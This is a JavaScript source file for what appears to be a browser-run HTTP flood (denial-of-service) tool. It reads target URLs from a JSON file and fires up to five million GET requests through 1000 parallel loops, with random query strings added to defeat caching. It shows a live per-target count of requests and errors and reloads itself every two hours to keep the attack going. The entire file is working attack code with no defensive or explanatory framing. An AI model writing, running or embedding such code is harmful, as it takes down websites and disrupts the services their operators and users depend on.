import targets from './targets.json'

let id = 0;
const targetStats = {}

targets.forEach((target) => {
  targetStats[target] = {number_of_requests: 0, number_of_errored_responses: 0}
})

const statsEl = document.getElementById('stats');

function printStats() {
  statsEl.innerHTML = 'total: '+id+'<br/><br/><table width="100%"><thead><tr><th align="left">URL</th><th align="left">Number of Requests</th><th align="left">Number of Errors</th></tr></thead><tbody>' + Object.entries(targetStats).map(([target, {
    number_of_requests,
    number_of_errored_responses
  }]) => '<tr><td>' + target + '</td><td>' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td></tr>').join('') + '</tbody></table>'

  setTimeout(printStats, 1000)
}

printStats()

function fetchWithTimeout(resource) {
  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), 1000);

  return fetch(resource, {
    method: 'GET',
    mode: 'no-cors',
    signal: controller.signal
  }).then((response) => {
    clearTimeout(id);
    return response;
  }).catch((error) => {
    clearTimeout(id);
    throw error;
  });
}

setTimeout(() => {
  function flood(target, id) {
    return fetchWithTimeout(target + (id % 3 === 0 ? '' : ('?' + Math.random() * 1000)))
      .catch((error) => {
        if (error.code === 20) {
          return;
        }

        targetStats[target].number_of_errored_responses++;
      })
      .then((response) => {
        if (response && !response.ok) {
          targetStats[target].number_of_errored_responses++;
        }
        targetStats[target].number_of_requests++;
      })
  }

  function run() {
    if (id === 5000000) {
      setTimeout(() => location.href = '?'+Date.now(), 5000)
    } else {
      id++;

      if (id < 5000000) {
        flood(targets[id % targets.length], id).finally(run)
      }
    }
  }

  for (let i = 0; i < 1000; i++) {
    run();
  }

  setTimeout(() => location.href = '?'+Date.now(), 2 * 60 * 60 * 1000)
}, 1000)

